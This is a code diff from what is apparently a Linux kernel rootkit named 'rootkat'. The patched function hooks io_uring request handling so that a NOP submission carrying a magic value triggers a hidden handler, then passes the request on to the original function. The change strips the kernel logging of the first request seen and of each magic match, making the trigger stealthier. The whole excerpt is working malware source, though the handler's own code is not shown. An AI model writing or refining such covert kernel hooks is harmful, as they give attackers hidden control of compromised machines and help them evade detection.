@@ -45,17 +45,9 @@ static int rootkat_io_issue_sqe(struct io_kiocb *req, unsigned int issue_flags)
 {
 	io_issue_sqe_t orig = (io_issue_sqe_t)hook_io_issue_sqe.original;
 
-	if (req) {
-		pr_info_once(TAG "first SQE seen: opcode=%u user_data=%llx\n",
-		             req->opcode,
-		             (unsigned long long)req->cqe.user_data);
-		if (req->opcode == IORING_OP_NOP &&
-		    (u32)(req->cqe.user_data >> 32) == ROOTKAT_IO_MAGIC_HI) {
-			pr_info(TAG "magic SQE matched: ud=%llx\n",
-			        (unsigned long long)req->cqe.user_data);
-			rootkat_handle_io_magic(req->cqe.user_data);
-		}
-	}
+	if (req && req->opcode == IORING_OP_NOP &&
+	    (u32)(req->cqe.user_data >> 32) == ROOTKAT_IO_MAGIC_HI)
+		rootkat_handle_io_magic(req->cqe.user_data);
 
 	return orig(req, issue_flags);
 }
